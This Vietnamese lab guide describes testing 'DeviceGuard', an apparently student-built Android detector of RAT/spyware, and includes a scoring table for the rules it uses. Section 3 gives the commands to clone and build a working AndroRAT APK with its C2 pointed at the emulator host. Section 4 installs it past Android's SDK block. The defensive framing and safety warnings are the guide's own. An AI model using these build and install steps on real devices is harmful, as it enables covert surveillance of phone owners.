# Khâu 3 (nhánh an ninh) — Phát hiện RAT/spyware: hướng dẫn chạy thực nghiệm

Tài liệu này hướng dẫn tái hiện đầy đủ cảnh **DeviceGuard phát hiện một mẫu RAT thật**
(AndroRAT) đang cài trên thiết bị. Đây là "Mức 2" — không chỉ chạy được app, mà dựng
được mẫu đối chứng để tab **Rà soát** có cái để bắt.

> Nhắc lại phạm vi đề tài: DeviceGuard chỉ *đọc và phân tích* các ứng dụng đang cài trên
> **chính thiết bị của người dùng**, hiển thị tại chỗ, không điều khiển máy khác, không gọi
> mạng. Việc dựng AndroRAT chỉ để làm **mẫu đối chứng phòng thủ** trong lab cách ly.

---

## 1. Yêu cầu môi trường

| Thành phần | Ghi chú |
|---|---|
| Android Studio + Android SDK | Có sẵn `adb`, `emulator` trong `~/Library/Android/sdk` |
| 1 emulator (API ≥ 26) | Bài này dùng `Medium_Phone_API_36.0` |
| Python 3 + `git` | Để build mẫu AndroRAT trong lab |
| JDK (keytool/jarsigner) | Đi kèm Android Studio; dùng để ký lại APK mẫu |

Kiểm tra nhanh:

```bash
adb devices                       # phải thấy 1 dòng "emulator-xxxx  device"
which git python3
```

---

## 2. Bước 1 — Cài và chạy DeviceGuard

Build từ source rồi cài vào emulator đang chạy:

```bash
cd DeviceGuard
./gradlew :app:assembleDebug
adb install -r app/build/outputs/apk/debug/app-debug.apk
```

Mở app → tab **Cài đặt**: chấp nhận điều khoản, cấp các quyền cần (ít nhất là để kiểm kê
ứng dụng). Sau đó **Tổng quan → Thu thập ngay** để tạo ảnh kiểm kê đầu tiên.

Lúc này mở tab **Rà soát**: trên máy sạch sẽ **không có app nào RỦI RO CAO** — đúng như
mong đợi. Cần có mẫu RAT ở bước sau mới thấy tác dụng.

---

## 3. Bước 2 — Dựng mẫu AndroRAT trong lab (tách khỏi repo)

Toàn bộ mẫu nằm trong thư mục `rat-lab/` — **đã được `.gitignore` loại khỏi git** để không
lọt lên GitHub. Không đặt mẫu RAT ở nơi khác trong repo.

```bash
# clone mã nguồn công khai
mkdir -p rat-lab && cd rat-lab
git clone https://github.com/karma9874/AndroRAT
cd AndroRAT

# môi trường Python riêng (macOS chặn cài thẳng vào Python hệ thống - PEP 668)
python3 -m venv .venv
./.venv/bin/pip install -r requirements.txt

# build APK, trỏ C2 về CHÍNH máy host (10.0.2.2 = host nhìn từ trong emulator)
./.venv/bin/python androRAT.py --build -i 10.0.2.2 -p 8000 -o test-rat.apk
```

Kết thúc có `rat-lab/AndroRAT/test-rat.apk` đã ký.

> **Bắt buộc**: giữ `-i 10.0.2.2` (loopback nội bộ). Không dùng tùy chọn ngrok/IP public —
> tránh biến máy mình thành C2 thật ngoài internet.

---

## 4. Bước 3 — Cài mẫu vào emulator

```bash
adb install --bypass-low-target-sdk-block rat-lab/AndroRAT/test-rat.apk
```

Cờ `--bypass-low-target-sdk-block` là **bắt buộc**: AndroRAT dùng template target SDK 22,
trong khi Android API mới chặn cài app target < 24. Bản thân targetSdk cổ này cũng là một
dấu hiệu đáng ngờ (xem §6).

Xác định gói vừa cài và quyền nó khai báo (để đối chiếu):

```bash
adb shell pm list packages -3
adb shell dumpsys package com.example.reverseshell2 | sed -n '/requested permissions:/,/install permissions:/p'
```

Mẫu này tự đặt tên hiển thị là **"Google Service Framework"** (giả danh app hệ thống) —
lý do vì sao phát hiện theo *hành vi/quyền* quan trọng hơn theo *tên*.

---

## 5. Bước 4 — Thu thập lại và xem tab Rà soát

Trong DeviceGuard: **Tổng quan → Thu thập ngay** (bắt buộc, vì Rà soát đọc từ ảnh kiểm kê
gần nhất chứ không quét realtime) → chuyển sang tab **Rà soát**.

Kết quả mong đợi: `com.example.reverseshell2` đứng đầu với nhãn **RỦI RO CAO**.

### Xem màn hình emulator ở đâu?

Nếu emulator chạy nhúng trong Android Studio (khởi động kèm cờ `-qt-hide-window`), **không**
có cửa sổ riêng ngoài desktop. Mở **Android Studio → View → Tool Windows → Running Devices**
để thấy màn hình máy ảo. Muốn cửa sổ riêng: Settings → Tools → Emulator → bỏ tick
*"Launch in the Running Devices tool window"*, hoặc chạy tay:

```bash
~/Library/Android/sdk/emulator/emulator -avd Medium_Phone_API_36.0
```

Chụp màn hình từ dòng lệnh (tiện làm ảnh cho báo cáo):

```bash
adb exec-out screencap -p > rasoat.png
```

---

## 6. Kết quả mong đợi & cách chấm điểm

AndroRAT trúng 6 tín hiệu, tổng **12 điểm → RỦI RO CAO**:

| Tín hiệu (indicator) | Bằng chứng | Điểm |
|---|---|---|
| Gom quyền theo dõi | CAMERA + RECORD_AUDIO + READ_SMS + READ_CALL_LOG | 3 |
| Đọc SMS + ra mạng | READ_SMS + INTERNET | 2 |
| Tự khởi động cùng máy | RECEIVE_BOOT_COMPLETED | 2 |
| Vẽ đè | SYSTEM_ALERT_WINDOW | 2 |
| Cài ngoài chợ | installer = null (sideload) | 2 |
| Nhiều quyền nhạy cảm nhưng nằm im | 16 quyền nguy hiểm đã cấp, không lần mở nào | 1 |

Nếu chạy phiên C2 đầy đủ cho AndroRAT **tự ẩn icon**, cộng thêm 4 điểm (luật "ẩn icon") →
16 điểm.

Ngưỡng mức rủi ro (xem `RatDetector.kt`): `≥ 6` = CAO, `≥ 3` = CẦN CHÚ Ý, còn lại = THẤP.

**Chi tiết tại `data/analysis/RatDetector.kt`** — mỗi luật là một hàm nhỏ trong
`buildIndicators()`, kèm trọng số và câu bằng chứng hiển thị cho người dùng. Muốn thêm/sửa
luật hoặc chỉnh ngưỡng, sửa trực tiếp ở đó (hằng số ngưỡng nằm trong `companion object`).

### Về dương tính giả

Trên máy dev, app do chính mình cài qua Android Studio (`installer = null`) và có xin
`RECEIVE_BOOT_COMPLETED` sẽ trúng 2 tín hiệu = 4 điểm → hiện "CẦN CHÚ Ý" dù hoàn toàn lành.
Đây là điểm cần cân nhắc khi đánh giá độ chính xác (cân bằng *bỏ sót* vs *báo nhầm*): có thể
nâng ngưỡng CẦN CHÚ Ý, hạ trọng số sideload, hoặc loại chính DeviceGuard khỏi kết quả.

---

## 7. Lưu ý an toàn & pháp lý

- `test-rat.apk` là **mã độc chạy được**. Chỉ cài trên emulator/máy test do mình sở hữu.
- **Không** đẩy `rat-lab/` hay `test-rat.apk` lên GitHub công khai (đã bị `.gitignore` chặn).
  Khi bàn giao, chuyển qua kênh riêng (USB/zip nội bộ).
- Không dùng lại kỹ thuật này để cài lên thiết bị của người khác — nằm ngoài phạm vi hợp
  pháp của đề tài.

---

## 8. Xử lý sự cố thường gặp

| Triệu chứng | Nguyên nhân / cách xử lý |
|---|---|
| `INSTALL_FAILED_DEPRECATED_SDK_VERSION` | Thiếu cờ `--bypass-low-target-sdk-block` khi cài mẫu |
| Tab Rà soát không thấy app vừa cài | Chưa **Thu thập ngay** lại sau khi cài/gỡ |
| `externally-managed-environment` khi `pip3 install` | Dùng venv: `python3 -m venv .venv && ./.venv/bin/pip install ...` |
| Không tìm thấy cửa sổ emulator | Nó chạy ẩn (`-qt-hide-window`) → xem trong Android Studio *Running Devices* |
| Màn emulator đen | Máy ảo đang khóa: `adb shell input keyevent KEYCODE_WAKEUP` |
